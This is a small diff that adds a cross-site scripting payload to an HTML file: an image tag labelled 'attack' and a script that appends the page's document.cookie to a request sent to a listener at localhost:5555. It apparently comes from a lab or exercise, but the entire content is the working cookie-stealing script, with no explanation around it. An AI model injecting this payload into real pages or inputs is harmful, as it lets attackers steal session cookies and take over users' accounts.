@@ -1,0 +1,4 @@
+<img id='attack' src='http://localhost:5555'>
+<script>
+document.getElementById('attack').src='http://localhost:5555?'+document.cookie;
+</script>
